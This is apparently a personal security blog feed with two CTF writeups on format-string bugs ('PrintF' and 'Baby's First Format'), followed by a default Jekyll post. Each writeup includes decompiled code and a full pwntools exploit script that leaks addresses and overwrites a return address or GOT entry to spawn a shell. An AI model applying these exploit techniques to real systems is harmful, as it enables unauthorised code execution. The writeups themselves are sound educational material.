feed.title: Psjsus4 blog
feed.subtitle: Here is a blog where I'll try to update my writeups, progress and notes on my cybersecurity journey.

entry.title: PrintF writeup
entry.content:
In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system("/bin/sh").

Code

void main(void)
{
    long i;
    char *pBuf;
    long in_FS_OFFSET;
    int var;
    char buf[520];
    long canary;

    canary = *(long *)(in_FS_OFFSET + 0x28);
    var = 1;
    pBuf = buf;
    for (i = 0x40; i != 0; i--)
    {
        pBuf(pcVar2, 0, 8);
        pcVar2 += 8;
    }
    puts("Easy peasy printf, don't you think?");
    printf("I feel generous so have this: %p
", &var);
    puts("Show me you've got!");
    printf("> ");
    read(0, buf, 512);
    puts("Here we go!!");
    printf(buf);
    /* WARNING: Subroutine does not return */
    exit(0);
}

1. Initial Leak & Offset Calculation

  1. Leak the stack pointer: The program prints a stack address via printf("...this: %p", &var).
  2. Find printf_ret: In GDB, I saw that the saved rsp value when printf returns is at stack_leak - 0x14
# In exploit():
recvu(b"this: 0x")
stack_leak = int(recvu(b"\n"), 16)
printf_ret  = stack_leak - 0x14

2. First Format-String Payload (Loop Back)

My goal is to overwrite the lsb of printf_ret so printf returns to an earlier part of main, letting me leak PIE and libc addresses and giving me the possibility to exploit the fsb again.

payload = (
    b"dummy420"      # align the count
  + b"||%79$p|"      # leak PIE
  + b"||%75$p|"      # leak libc
  + b"|%12$hhn"      # write 1 byte into printf_ret
  + p64(printf_ret)
)
  • %12$hhn writes the number of printed bytes so far into the printf RIP address.

After this, the program loops and prints:

dummy420||0x<pie_leak>|||0x<libc_leak>|...

3. Compute PIE & libc Bases

  • PIE base = pie_leak - 0x1211
  • libc base = libc_leak - 0x2A1CA
pie_base     = pie_leak    - 0x1211
libc.address = libc_leak   - 0x2A1CA

4. Second Payload: ROP Chain

With base addresses known, I build a ROP chain:

  1. Gadgets:

    • pop rdi; ret at libc + 0x10f75b
    • sleep; ret at libc + 0x4c161 (stack alignment)

  2. Arguments:

    • Address of /bin/sh in libc
    • system function address

I lay this out starting at printf_ret:

pop_rdi = libc.address + 0x10f75b
ret   = libc.address + 0x4c161
binsh   = next(libc.search(b"/bin/sh"))
system  = libc.sym['system']

payload2 = fmtstr_payload(
    8,
    {
        printf_ret        : pop_rdi,
        printf_ret + 0x8  : binsh,
        printf_ret + 0x10 : ret,
        printf_ret + 0x18 : system,
    }
)

When printf returns, it jumps into my ROP chain and runs system("/bin/sh").

5. Full Exploit Script

#!python

from pwn import *
import pwn
from sys import argv
from os import getcwd
from time import sleep

speed = 0#.5

e = ELF("./printf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e
context.terminal = ["kitty", "@", "new-window", "--cwd", getcwd()]
context.gdbinit = "/etc/profiles/per-user/darktar/share/pwndbg/gdbinit.py"

r: process = None

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: r.sendlineafter(a, b)
sa = lambda a, b: r.sendafter(a, b)
sl = lambda a: (sleep(speed), r.sendline(a))
s = lambda a: (sleep(speed), r.send(a))
recv = lambda: (sleep(speed), r.recv())[1]
recvn = lambda a: (sleep(speed), r.recvn(a))[1]
recvu = lambda a, b=True: (sleep(speed), r.recvuntil(a, b))[1]
clean = lambda: r.clean()
success = lambda a: log.success(a)
fail = lambda a: log.failure(a)
info = lambda a: log.info(a)

gdbscript = '''
    b main
    continue
'''

def conn():
    global r
    if len(argv) > 1:
        if argv[1] == "gdb":
            r = gdb.debug([e.path], gdbscript=gdbscript)
        else:
            ip, port = argv[1], argv[2]
            r = remote(ip, port)
    else:
        r = e.process()



def exploit():
    recvu(b"this: 0x")
    stack_leak = int(recvu(b"\n"),16)
    info(hex(stack_leak))
    printf_ret = stack_leak - 0x14
    payload = b"dummy420"+b"||%79$p|"+b"||%75$p|"+b"|%12$hhn"+p64(printf_ret)
    info(payload)
    sl(payload)
    recvu(b"|0x")
    pie_base = int(recvu(b"|"),16) - 0x1211
    info(hex(pie_base))
    recvu(b"|0x")
    libc.address = int(recvu(b"|"),16) - 0x2A1CA
    info(hex(libc.address))
    pop_rdi = libc.address + 0x10f75b
    ret = libc.address + 0x4c161
    payload = fmtstr_payload(8,
        {
        printf_ret      : pop_rdi,
        printf_ret+0x8  : next(libc.search('/bin/sh')),
        printf_ret+0x10 : ret, #fix misalignment
        printf_ret+0x18 : libc.sym['system'],
        }
    )
    recvu(b"you've got!")
    sl(payload)
    print("good luck pwning :)")



conn()
exploit()

# good luck pwning :)
r.interactive()

good luck pwning :)
entry.summary: In this challenge, I exploit a printf vulnerability. The program leaks a stack address and I use it to calculate the location of printf’s return address on the stack. By overwriting its lsb, I force the program to return into and earlier part of main instead of exiting. Like that I gave me another round to exploit the printf vulnerability while having leaks for PIE and libc. Finally, I send a payload that replaces again the printf return address but this time with a ROP chain calling system("/bin/sh").

entry.title: Baby’s First Format writeup
entry.content:
We are given a 64-bit ELF binary (baby_fmt) that reads a string from the user, applies a custom encoder and then prints it out via printf() if the input contains "funny". But since the output is not formatted it’s vulnerable to the fsb. I exploited it by overwriting the got of __stack_chk_fail with a hidden function that calls system("/bin/sh"):

baby_fmt code

void win(void)
{
    system("/bin/sh");
    return;
}

void stuff(char *buf)
{
    size_t size = strlen(buf);
    for (int i = 0; i < (int)size; i++) {
        char var = (char)i;
        if ((buf[i] < 'a') || ('z' < buf[i])) {
            if ((buf[i] < '0') || ('9' < buf[i])) {
                if ((buf[i] < 'A') || ('Z' < buf[i])) {
                    if ((buf[i] == '%') && (buf[i] == '$'))
                        buf[i] = buf[i] + var + (char)(i/7)*-7;
                } else {
                    buf[i] = '\0';
                }
            } else if ((int)buf[i] + i % 7 < L':') {
                buf[i] = buf[i] + var + (char)(i/7)*-7;
            } else {
                buf[i] = var + (char)(i/7)*-7 + buf[i] + -10;
            }
        } else if ((int)buf[i] + i % 7 < L'{') {
            buf[i] = buf[i] + var + (char)(i/7)*-7;
        } else {
            buf[i] = var + (char)(i/7)*-7 + buf[i] + -26;
        }
    }
    return;
}

void main(void)
{
    long funny;
    long in_FS_OFFSET;
    char buf[104];
    long canary;

    canary = *(long *)(in_FS_OFFSET + 0x28);
    puts("Tell me some funny things!");
    fgets(buf,0x78,stdin);
    funny = strstr(buf,"funny");
    if (funny != 0) {
        stuff(buf);
        printf(buf);
    }
    if (canary != *(long *)(in_FS_OFFSET + 0x28))
        __stack_chk_fail();
    return;
}

Compiled with canary, NX enabled, Partial RELRO and NO PIE.

Vulnerability Overview

  1. Format-String Bug: Calling printf(buf) without a format string allows both reads and writes via %n.

  2. Custom Encoder: The stuff() function shifts lowercase letters and digits by (index mod 7) (similar to a caesar cipher) before printf.

Exploit Strategy

  1. Prefix input with "funny" so strstr(buf, "funny") succeeds.
  2. Build a format-string payload to overwrite the GOT entry for __stack_chk_fail with the address of win().
  3. Pre-encode the payload so that after stuff() applies its shifts, the format specifiers and target address are correct.
  4. When the canary check fails, __stack_chk_fail() is called — now redirected to win() — giving a shell.

Exploit Script

#!python

from pwn import *
import pwn
from sys import argv
from os import getcwd
from time import sleep

speed = 0#.5

e = ELF("./baby_fmt_patched")

context.binary = e
context.terminal = ["kitty", "@", "new-window", "--cwd", getcwd()]
context.gdbinit = "/etc/profiles/per-user/darktar/share/pwndbg/gdbinit.py"

r: process = None

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: r.sendlineafter(a, b)
sa = lambda a, b: r.sendafter(a, b)
sl = lambda a: (sleep(speed), r.sendline(a))
s = lambda a: (sleep(speed), r.send(a))
recv = lambda: (sleep(speed), r.recv())[1]
recvn = lambda a: (sleep(speed), r.recvn(a))[1]
recvu = lambda a, b=True: (sleep(speed), r.recvuntil(a, b))[1]
clean = lambda: r.clean()
success = lambda a: log.success(a)
fail = lambda a: log.failure(a)
info = lambda a: log.info(a)

gdbscript = '''
    b main
    continue
'''

def conn():
    global r
    if len(argv) > 1:
        if argv[1] == "gdb":
            r = gdb.debug([e.path], gdbscript=gdbscript)
        else:
            ip, port = argv[1], argv[2]
            r = remote(ip, port)
    else:
        r = e.process()

def generate_input_bytes(desired_output: bytes) -> bytes:
    input_bytes = []
    for idx, c in enumerate(desired_output):
        shift = idx % 7

        if ord('a') <= c <= ord('z'):
            original = c - shift
            if original < ord('a'):
                original += 26
            input_bytes.append(original)

        elif ord('0') <= c <= ord('9'):
            original = c - shift
            if original < ord('0'):
                original += 10
            input_bytes.append(original)

        else:
            input_bytes.append(c)

    return bytes(input_bytes)

def exploit():
    win = 0x4015cd
    payload = b"funny123"
    payload += fmtstr_payload(7, {e.got['__stack_chk_fail'] : win}, numbwritten=8)
    print(f"payload: {payload}")
    payload = generate_input_bytes(payload)
    payload = b"funny"+payload[5::]
    payload = payload.ljust(106, b"a")
    sl(payload)
    print("good luck pwning :)")



conn()
exploit()

# good luck pwning :)
r.interactive()

good luck pwning :)

Getting the flag

That was the ez part… The hard part was how to get the flag since there is no service to connect to.

After countless hours (2) of social enginnering the sh*t out of the admins by showing and proving that the solve is correct…

I got the flagBitCTF{f0rm4t_str1ng_bugs_ar3_ez}
entry.summary: We are given a 64-bit ELF binary (baby_fmt) that reads a string from the user, applies a custom encoder and then prints it out via printf() if the input contains "funny". But since the output is not formatted it’s vulnerable to the fsb. I exploited it by overwriting the got of __stack_chk_fail with a hidden function that calls system("/bin/sh"):

entry.title: Welcome to Jekyll!!
entry.content:
You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.

To add new posts, simply add a file in the _posts directory that follows the convention YYYY-MM-DD-name-of-post.ext and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.

Jekyll also offers powerful support for code snippets:

Check out the Jekyll docs for more info on how to get the most out of Jekyll. File all bugs/feature requests at Jekyll’s GitHub repo. If you have questions, you can ask them on Jekyll Talk.
entry.summary: You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.
